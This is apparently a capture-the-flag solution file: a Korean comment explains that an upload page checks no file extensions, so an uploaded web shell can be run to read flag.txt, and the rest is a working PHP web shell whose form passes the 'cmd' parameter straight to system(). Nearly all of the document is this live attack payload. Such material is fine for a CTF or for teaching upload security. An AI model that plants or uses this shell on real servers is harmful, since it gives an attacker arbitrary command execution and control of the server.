<!--
    solution..!
- upload.php에 어떠한 확장자도 체크하고 있지 않음
- webshell을 실행하는 코드가 담긴 파일 업로드
- 업로드 후 /list에 가면 파일 실행을 할 수 있음
- flag.txt 경로가 있는 곳 까지 가서 cat flag.txt 실행
 -->
<html><body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form><pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?></pre></body></html>